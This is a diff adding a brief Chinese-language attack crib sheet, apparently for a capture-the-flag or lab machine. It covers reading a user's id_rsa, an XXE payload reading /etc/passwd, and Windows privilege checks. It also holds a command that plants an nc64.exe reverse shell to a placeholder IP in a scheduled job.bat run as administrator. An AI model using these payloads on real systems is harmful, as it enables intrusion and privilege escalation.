@@ -1,0 +1,12 @@
+工具：
+
+知识点：文件读取用户的id_rsa  ssh密钥登陆 定时任务提权
+
+<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+
+xml 中还需要使用到example变量
+
+shell:
+whoami /priv #当前用户权限
+icacls job.bat # 显示文件的访问控制权限
+echo C:\Log-Management\nc64.exe -e cmd.exe {your_IP} {port} > C:\LogManagement\job.bat #上传nc主动连接 job.bat会以aministrator运行 正向连接shell
